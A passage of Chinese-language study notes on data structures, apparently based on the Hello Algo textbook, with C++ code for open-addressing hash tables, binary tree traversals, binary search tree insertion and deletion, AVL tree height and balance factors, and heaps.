class="hljs-literal">nullptr</span> &amp;&amp; buckets[index] != TOMBSTONE) &#123;<br>            <span class="hljs-keyword">delete</span> buckets[index];<br>            buckets[index] = TOMBSTONE;<br>            size--;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 扩容哈希表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">extend</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-comment">// 暂存原哈希表</span><br>        vector&lt;Pair *&gt; bucketsTmp = buckets;<br>        <span class="hljs-comment">// 初始化扩容后的新哈希表</span><br>        capacity *= extendRatio;<br>        buckets = <span class="hljs-built_in">vector</span>&lt;Pair *&gt;(capacity, <span class="hljs-literal">nullptr</span>);<br>        size = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 将键值对从原哈希表搬运至新哈希表</span><br>        <span class="hljs-keyword">for</span> (Pair *pair : bucketsTmp) &#123;<br>            <span class="hljs-keyword">if</span> (pair != <span class="hljs-literal">nullptr</span> &amp;&amp; pair != TOMBSTONE) &#123;<br>                <span class="hljs-built_in">put</span>(pair-&gt;key, pair-&gt;val);<br>                <span class="hljs-keyword">delete</span> pair;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 打印哈希表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (Pair *pair : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (pair == <span class="hljs-literal">nullptr</span>) &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;nullptr&quot;</span> &lt;&lt; endl;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pair == TOMBSTONE) &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;TOMBSTONE&quot;</span> &lt;&lt; endl;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cout &lt;&lt; pair-&gt;key &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; pair-&gt;val &lt;&lt; endl;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>平方探测：</li></ol><p>平方探测与线性探测类似，都是开放寻址的常见策略之一。当发生冲突时，平方探测不是简单地跳过一个固定的步数，而是跳过“探测次数的平方”的步数，即$1,4,9,…$步。</p><p>平方探测主要具有以下优势。</p><ul><li>平方探测通过跳过探测次数平方的距离，试图缓解线性探测的聚集效应。</li><li>平方探测会跳过更大的距离来寻找空位置，有助于数据分布得更加均匀。</li></ul><p>然而，平方探测并不是完美的。</p><ul><li>仍然存在聚集现象，即某些位置比其他位置更容易被占用。</li><li>由于平方的增长，平方探测可能不会探测整个哈希表，这意味着即使哈希表中有空桶，平方探测也可能无法访问到它。</li></ul><ol start="3"><li>多次哈希：</li></ol><p>顾名思义，多次哈希方法使用多个哈希函数$f_1(x)$、$f_2(x)$、$f_3(x)$ …进行探测。</p><ul><li><strong>插入元素</strong>：若哈希函数$f_1(x)$出现冲突，则尝试$f_2(x)$，以此类推，直到找到空位后插入元素。</li><li><strong>查找元素</strong>：在相同的哈希函数顺序下进行查找，直到找到目标元素时返回；若遇到空位或已尝试所有哈希函数，说明哈希表中不存在该元素，则返回 <code>None</code> 。</li></ul><p>与线性探测相比，多次哈希方法不易产生聚集，但多个哈希函数会带来额外的计算量。</p><p class="note note-success">请注意，开放寻址（线性探测、平方探测和多次哈希）哈希表都存在“不能直接删除元素”的问题。</p><h3 id="第7章-二叉树"><a href="#第7章-二叉树" class="headerlink" title="第7章 二叉树"></a>第7章 二叉树</h3><h4 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h4><p>从物理结构的角度来看，树是一种基于链表的数据结构，因此其遍历方式是通过指针逐个访问节点。然而，树是一种非线性数据结构，这使得遍历树比遍历链表更加复杂，需要借助搜索算法来实现。</p><p>二叉树常见的遍历方式包括层序遍历、前序遍历、中序遍历和后序遍历等。</p><h5 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h5><p>如图所示，层序遍历（level-order traversal）从顶部到底部逐层遍历二叉树，并在每一层按照从左到右的顺序访问节点。</p><p>层序遍历本质上属于广度优先遍历（breadth-first traversal），也称广度优先搜索（breadth-first search, BFS），它体现了一种“一圈一圈向外扩展”的逐层遍历方式。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_tree_traversal.assets/binary_tree_bfs.png" srcset="/img/loading.gif" lazyload></p><p>广度优先遍历通常借助“队列”来实现。队列遵循“先进先出”的规则，而广度优先遍历则遵循“逐层推进”的规则，两者背后的思想是一致的。实现代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 层序遍历 */</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">levelOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化队列，加入根节点</span><br>    queue&lt;TreeNode *&gt; queue;<br>    queue.<span class="hljs-built_in">push</span>(root);<br>    <span class="hljs-comment">// 初始化一个列表，用于保存遍历序列</span><br>    vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-built_in">empty</span>()) &#123;<br>        TreeNode *node = queue.<span class="hljs-built_in">front</span>();<br>        queue.<span class="hljs-built_in">pop</span>();              <span class="hljs-comment">// 队列出队</span><br>        vec.<span class="hljs-built_in">push_back</span>(node-&gt;val); <span class="hljs-comment">// 保存节点值</span><br>        <span class="hljs-keyword">if</span> (node-&gt;left != <span class="hljs-literal">nullptr</span>)<br>            queue.<span class="hljs-built_in">push</span>(node-&gt;left); <span class="hljs-comment">// 左子节点入队</span><br>        <span class="hljs-keyword">if</span> (node-&gt;right != <span class="hljs-literal">nullptr</span>)<br>            queue.<span class="hljs-built_in">push</span>(node-&gt;right); <span class="hljs-comment">// 右子节点入队</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> vec;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="前序、中序、后序遍历"><a href="#前序、中序、后序遍历" class="headerlink" title="前序、中序、后序遍历"></a>前序、中序、后序遍历</h5><p>相应地，前序、中序和后序遍历都属于深度优先遍历（depth-first traversal），也称深度优先搜索（depth-first search, DFS），它体现了一种“先走到尽头，再回溯继续”的遍历方式。</p><p>图中展示了对二叉树进行深度优先遍历的工作原理。<strong>深度优先遍历就像是绕着整棵二叉树的外围“走”一圈</strong>，在每个节点都会遇到三个位置，分别对应前序遍历、中序遍历和后序遍历。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_tree_traversal.assets/binary_tree_dfs.png" srcset="/img/loading.gif" lazyload></p><p>深度优先搜索通常基于递归实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 前序遍历 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 访问优先级：根节点 -&gt; 左子树 -&gt; 右子树</span><br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;left);<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">/* 中序遍历 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">inOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 访问优先级：左子树 -&gt; 根节点 -&gt; 右子树</span><br>    <span class="hljs-built_in">inOrder</span>(root-&gt;left);<br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>    <span class="hljs-built_in">inOrder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">/* 后序遍历 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">postOrder</span><span class="hljs-params">(TreeNode *root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 访问优先级：左子树 -&gt; 右子树 -&gt; 根节点</span><br>    <span class="hljs-built_in">postOrder</span>(root-&gt;left);<br>    <span class="hljs-built_in">postOrder</span>(root-&gt;right);<br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h4><p>如图所示，二叉搜索树（binary search tree）满足以下条件。</p><ol><li>对于根节点，左子树中所有节点的值 根节点的值 右子树中所有节点的值。</li><li>任意节点的左、右子树也是二叉搜索树，即同样满足条件 <code>1.</code> 。</li></ol><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/binary_search_tree.png" srcset="/img/loading.gif" lazyload></p><h5 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h5><p>给定目标节点值 <code>num</code> ，可以根据二叉搜索树的性质来查找。我们声明一个节点 <code>cur</code> ，从二叉树的根节点 <code>root</code> 出发，循环比较节点值 <code>cur.val</code> 和 <code>num</code> 之间的大小关系。</p><ul><li>若 <code>cur.val &lt; num</code> ，说明目标节点在 <code>cur</code> 的右子树中，因此执行 <code>cur = cur.right</code> 。</li><li>若 <code>cur.val &gt; num</code> ，说明目标节点在 <code>cur</code> 的左子树中，因此执行 <code>cur = cur.left</code> 。</li><li>若 <code>cur.val = num</code> ，说明找到目标节点，跳出循环并返回该节点。</li></ul><p>二叉搜索树的查找操作与二分查找算法的工作原理一致，都是每轮排除一半情况。循环次数最多为二叉树的高度，当二叉树平衡时，使用$O(logn)$时间。</p><h5 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h5><p>给定一个待插入元素 <code>num</code> ，为了保持二叉搜索树“左子树 &lt; 根节点 &lt; 右子树”的性质，插入操作流程如图所示。</p><ol><li><strong>查找插入位置</strong>：与查找操作相似，从根节点出发，根据当前节点值和 <code>num</code> 的大小关系循环向下搜索，直到越过叶节点（遍历至 <code>None</code>）时跳出循环。</li><li><strong>在该位置插入节点</strong>：初始化节点 <code>num</code> ，将该节点置于 <code>None</code> 的位置。</li></ol><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_insert.png" srcset="/img/loading.gif" lazyload></p><p>在代码实现中，需要注意以下两点。</p><ul><li>二叉搜索树不允许存在重复节点，否则将违反其定义。因此，若待插入节点在树中已存在，则不执行插入，直接返回。</li><li>为了实现插入节点，我们需要借助节点 <code>pre</code> 保存上一轮循环的节点。这样在遍历至 <code>None</code> 时，我们可以获取到其父节点，从而完成节点插入操作。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 插入节点 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>    <span class="hljs-comment">// 若树为空，则初始化根节点</span><br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>        root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(num);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    TreeNode *cur = root, *pre = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 循环查找，越过叶节点后跳出</span><br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-comment">// 找到重复节点，直接返回</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val == num)<br>            <span class="hljs-keyword">return</span>;<br>        pre = cur;<br>        <span class="hljs-comment">// 插入位置在 cur 的右子树中</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val &lt; num)<br>            cur = cur-&gt;right;<br>        <span class="hljs-comment">// 插入位置在 cur 的左子树中</span><br>        <span class="hljs-keyword">else</span><br>            cur = cur-&gt;left;<br>    &#125;<br>    <span class="hljs-comment">// 插入节点</span><br>    TreeNode *node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(num);<br>    <span class="hljs-keyword">if</span> (pre-&gt;val &lt; num)<br>        pre-&gt;right = node;<br>    <span class="hljs-keyword">else</span><br>        pre-&gt;left = node;<br>&#125;<br></code></pre></td></tr></table></figure><p>与查找节点相同，插入节点使用$O(logn)$时间。</p><h5 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h5><p>先在二叉树中查找到目标节点，再将其删除。与插入节点类似，我们需要保证在删除操作完成后，二叉搜索树的“左子树 &lt; 根节点 &lt; 右子树”的性质仍然满足。因此，我们根据目标节点的子节点数量，分 0、1 和 2 三种情况，执行对应的删除节点操作。</p><p>如图所示，当待删除节点的度为0时，表示该节点是叶节点，可以直接删除。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_remove_case1.png" srcset="/img/loading.gif" lazyload></p><p>当待删除节点的度为1时，将待删除节点替换为其子节点即可。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_remove_case2.png" srcset="/img/loading.gif" lazyload></p><p>当待删除节点的度为2时，我们无法直接删除它，而需要使用一个节点替换该节点。由于要保持二叉搜索树“左子节点 &lt; 根节点 &lt; 右子节点”的性质，<strong>因此这个节点可以是右子树的最小节点或左子树的最大节点</strong>。</p><p>假设我们选择右子树的最小节点（中序遍历的下一个节点），则删除操作流程为：</p><ol><li>找到待删除节点在“中序遍历序列”中的下一个节点，记为 <code>tmp</code> 。</li><li>用 <code>tmp</code> 的值覆盖待删除节点的值，并在树中递归删除节点 <code>tmp</code> 。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 删除节点 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>    <span class="hljs-comment">// 若树为空，直接提前返回</span><br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    TreeNode *cur = root, *pre = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 循环查找，越过叶节点后跳出</span><br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-comment">// 找到待删除节点，跳出循环</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val == num)<br>            <span class="hljs-keyword">break</span>;<br>        pre = cur;<br>        <span class="hljs-comment">// 待删除节点在 cur 的右子树中</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val &lt; num)<br>            cur = cur-&gt;right;<br>        <span class="hljs-comment">// 待删除节点在 cur 的左子树中</span><br>        <span class="hljs-keyword">else</span><br>            cur = cur-&gt;left;<br>    &#125;<br>    <span class="hljs-comment">// 若无待删除节点，则直接返回</span><br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 子节点数量 = 0 or 1</span><br>    <span class="hljs-keyword">if</span> (cur-&gt;left == <span class="hljs-literal">nullptr</span> || cur-&gt;right == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-comment">// 当子节点数量 = 0 / 1 时， child = nullptr / 该子节点</span><br>        TreeNode *child = cur-&gt;left != <span class="hljs-literal">nullptr</span> ? cur-&gt;left : cur-&gt;right;<br>        <span class="hljs-comment">// 删除节点 cur</span><br>        <span class="hljs-keyword">if</span> (cur != root) &#123;<br>            <span class="hljs-keyword">if</span> (pre-&gt;left == cur)<br>                pre-&gt;left = child;<br>            <span class="hljs-keyword">else</span><br>                pre-&gt;right = child;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 若删除节点为根节点，则重新指定根节点</span><br>            root = child;<br>        &#125;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">delete</span> cur;<br>    &#125;<br>    <span class="hljs-comment">// 子节点数量 = 2</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 获取中序遍历中 cur 的下一个节点</span><br>        TreeNode *tmp = cur-&gt;right;<br>        <span class="hljs-keyword">while</span> (tmp-&gt;left != <span class="hljs-literal">nullptr</span>) &#123;<br>            tmp = tmp-&gt;left;<br>        &#125;<br>        <span class="hljs-type">int</span> tmpVal = tmp-&gt;val;<br>        <span class="hljs-comment">// 递归删除节点 tmp</span><br>        <span class="hljs-built_in">remove</span>(tmp-&gt;val);<br>        <span class="hljs-comment">// 用 tmp 覆盖 cur</span><br>        cur-&gt;val = tmpVal;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="中序遍历有序"><a href="#中序遍历有序" class="headerlink" title="中序遍历有序"></a>中序遍历有序</h5><p>如图所示，二叉树的中序遍历遵循“左$\rightarrow$根$\rightarrow$右”的遍历顺序，而二叉搜索树满足“左子节点 &lt; 根节点 &lt; 右子节点”的大小关系。</p><p>这意味着在二叉搜索树中进行中序遍历时，总是会优先遍历下一个最小节点，从而得出一个重要性质：<strong>二叉搜索树的中序遍历序列是升序的</strong>。</p><p>利用中序遍历升序的性质，我们在二叉搜索树中获取有序数据仅需$O(n)$时间，无须进行额外的排序操作，非常高效。</p><p><img src="https://www.hello-algo.com/chapter_tree/binary_search_tree.assets/bst_inorder_traversal.png" srcset="/img/loading.gif" lazyload></p><h4 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h4><p>在“二叉搜索树”章节中我们提到，在多次插入和删除操作后，二叉搜索树可能退化为链表。在这种情况下，所有操作的时间复杂度将从$O(logn)$劣化为$O(n)$。</p><p>1962 年 G. M. Adelson-Velsky 和 E. M. Landis 在论文“An algorithm for the organization of information”中提出了 AVL 树。论文中详细描述了一系列操作，确保在持续添加和删除节点后，AVL 树不会退化，从而使得各种操作的时间复杂度保持在$O(logn)$级别。换句话说，在需要频繁进行增删查改操作的场景中，AVL 树能始终保持高效的数据操作性能，具有很好的应用价值。</p><h5 id="AVL树常见术语"><a href="#AVL树常见术语" class="headerlink" title="AVL树常见术语"></a>AVL树常见术语</h5><p>AVL 树既是二叉搜索树，也是平衡二叉树，同时满足这两类二叉树的所有性质，因此是一种平衡二叉搜索树。</p><ol><li>节点高度</li></ol><p>由于 AVL 树的相关操作需要获取节点高度，因此我们需要为节点类添加 <code>height</code> 变量：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* AVL 树节点类 */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val&#123;&#125;;          <span class="hljs-comment">// 节点值</span><br>    <span class="hljs-type">int</span> height = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 节点高度</span><br>    TreeNode *left&#123;&#125;;   <span class="hljs-comment">// 左子节点</span><br>    TreeNode *right&#123;&#125;;  <span class="hljs-comment">// 右子节点</span><br>    <span class="hljs-built_in">TreeNode</span>() = <span class="hljs-keyword">default</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">TreeNode</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> : val(x)&#123;</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>“节点高度”是指从该节点到它的最远叶节点的距离，即所经过的“边”的数量。需要特别注意的是，叶节点的高度为$0$，而空节点的高度为$-1$。我们将创建两个工具函数，分别用于获取和更新节点的高度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 获取节点高度 */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">height</span><span class="hljs-params">(TreeNode *node)</span> </span>&#123;<br>    <span class="hljs-comment">// 空节点高度为 -1 ，叶节点高度为 0</span><br>    <span class="hljs-keyword">return</span> node == <span class="hljs-literal">nullptr</span> ? <span class="hljs-number">-1</span> : node-&gt;height;<br>&#125;<br><br><span class="hljs-comment">/* 更新节点高度 */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">updateHeight</span><span class="hljs-params">(TreeNode *node)</span> </span>&#123;<br>    <span class="hljs-comment">// 节点高度等于最高子树高度 + 1</span><br>    node-&gt;height = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">height</span>(node-&gt;left), <span class="hljs-built_in">height</span>(node-&gt;right)) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>节点平衡因子</li></ol><p>节点的平衡因子（balance factor）定义为节点左子树的高度减去右子树的高度，同时规定空节点的平衡因子为$0$。我们同样将获取节点平衡因子的功能封装成函数，方便后续使用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 获取平衡因子 */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">balanceFactor</span><span class="hljs-params">(TreeNode *node)</span> </span>&#123;<br>    <span class="hljs-comment">// 空节点平衡因子为 0</span><br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 节点平衡因子 = 左子树高度 - 右子树高度</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">height</span>(node-&gt;left) - <span class="hljs-built_in">height</span>(node-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure><p>设平衡因子为$f$，则一棵 AVL 树的任意节点的平衡因子皆满足$-1 \leq f \leq 1$  。</p><h5 id="AVL树旋转"><a href="#AVL树旋转" class="headerlink" title="AVL树旋转"></a>AVL树旋转</h5><p>具体步骤参考：<a href="https://www.hello-algo.com/chapter_tree/avl_tree/#752-avl">https://www.hello-algo.com/chapter_tree/avl_tree/#752-avl</a></p><h3 id="第8章-堆"><a href="#第8章-堆" class="headerlink" title="第8章 堆"></a>第8章 堆</h3><h4 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h4><p>堆（heap）是一种满足特定条件的完全二叉树，主要可分为两种类型，如图所示。</p><ul><li>小顶堆（min heap）：任意节点的值 $\leq$ 其子节点的值。</li><li>大顶堆（max heap）：任意节点的值 $\geq$ 其子节点的值。</li></ul><p><img src="https://www.hello-algo.com/chapter_heap/heap.assets/min_heap_and_max_heap.png" srcset="/img/loading.gif" lazyload></p><p>堆作为完全二叉树的一个特例，具有以下特性。</p><ul><li>最底层节点靠左填充，其他层的节点都被填满。</li><li>我们将二叉树的根节点称为“堆顶”，将底层最靠右的节点称为“堆底”。</li><li>对于大顶堆（小顶堆），堆顶元素（根节点）的值是最大（最小）的。</li></ul><h5 id="堆的常用操作"><a href="#堆的常用操作" class="headerlink" title="堆的常用操作"></a>堆的常用操作</h5><p>需要指出的是，许多编程语言提供的是优先队列（priority queue），这是一种抽象的数据结构，定义为具有优先级排序的队列。</p><p>实际上，<strong>堆通常用于实现优先队列，大顶堆相当于元素按从大到小的顺序出队的优先队列</strong>。从使用角度来看，我们可以将“优先队列”和“堆”看作等价的数据结构。因此，本书对两者不做特别区分，统一称作“堆”。</p><p>堆的常用操作见下表 ，方法名需要根据编程语言来确定。</p><table><thead><tr><th align="center">方法名</th><th align="center">描述</th><th align="center">时间复杂度</th></tr></thead><tbody><tr><td align="center"><code>push()</code></td><td align="center">元素入堆</td><td align="center">$O(logn)$</td></tr><tr><td align="center"><code>pop()</code></td><td align="center">堆顶元素出堆</td><td align="center">$O(logn)$</td></tr><tr><td align="center"><code>peek()</code></td><td align="center">访问堆顶元素（对于大 &#x2F; 小顶堆分别为最大 &#x2F; 小值）</td><td align="center">$O(1)$</td></tr><tr><td align="center"><code>size()</code></td><td align="center">获取堆的元素数量</td><td align="center">$O(1)$</td></tr><tr><td align="center"><code>isEmpty()</code></td><td align="center">判断堆是否为空</td><td align="center">$O(1)$</td></tr></tbody></table><p>在实际应用中，我们可以直接使用编程语言提供的堆类（或优先队列类）。</p><p>类似于排序算法中的“从小到大排列”和“从大到小排列”，我们可以通过设置一个 <code>flag</code> 或修改 <code>Comparator</code> 实现“小顶堆”与“大顶堆”之间的转换。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化堆 */</span><br><span class="hljs-comment">// 初始化小顶堆</span><br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; minHeap;<br><span class="hljs-comment">// 初始化大顶堆</span><br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, less&lt;<span class="hljs-type">int</span>&gt;&gt; maxHeap;<br><br><span class="hljs-comment">/* 